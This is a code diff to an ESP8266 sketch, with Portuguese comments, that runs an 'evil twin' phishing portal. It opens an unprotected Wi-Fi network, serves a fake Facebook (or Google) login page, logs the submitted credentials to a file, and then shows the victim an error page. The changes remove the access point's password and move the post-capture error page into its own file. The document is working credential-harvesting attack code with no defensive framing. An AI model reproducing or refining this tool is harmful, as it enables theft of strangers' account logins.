@@ -7,16 +7,16 @@
 #include <FS.h>
 #include "google.h"
 #include "facebook.h"
+#include "erro.h"
 
 #define LOGFILE "/log.txt"
  
 // Ponto de acesso
-const char *ssid="...";
-const char *password="123456789";
-
+const char *ssid="Wi-Fi";
 
 // Login da pagina de captura
 #define captivePortalPage FACEBOOK_HTML
+#define erroPage ERROPAGE_HTML
 // GOOGLE_HTML, FACEBOOK_HTML
 
 // Configuração básica usando configurações de rede comuns (porta DNS usual, IP e porta do servidor web)
@@ -80,7 +80,7 @@ void setup() {
   WiFi.mode(WIFI_AP);
   delay(2000);
   WiFi.softAPConfig(apIP, apIP, netMsk);
-  WiFi.softAP(ssid, password);
+  WiFi.softAP(ssid);
   delay(500);
   Serial.println(" Sucesso!");
 
@@ -117,15 +117,13 @@ void setup() {
     f.close();
     
     // Envie uma resposta de erro ao usuário após a coleta de credencial
-    webString = "<style> *{ } html { height: 100%; } body{ font-family: 'Lato', sans-serif; color: #888; margin: 0; } #main{ display: table; width: 100%; height: 100vh; text-align: center; } .fof{ display: table-cell; vertical-align: middle; } .fof h1{ font-size: 50px; display: inline-block; padding-right: 12px; } } </style> <div id=\"main\"> <div class=\"fof\"> <h1>Error 404</h1> </div> </div>";
-
-    server.send(500, "text/html", webString);
+    server.send(500, "text/html", erroPage);
 
     // Reinicializar strings de buffer
     serialString="";
     webString="";
 
-    blink(5);
+    blink(2);
     
   });
 
@@ -160,7 +158,7 @@ void setup() {
   server.begin();
   Serial.println(" Sucesso!");
   
-  blink(10);
+  blink(1);
   
   Serial.println("Dispositivo pronto!");
 }
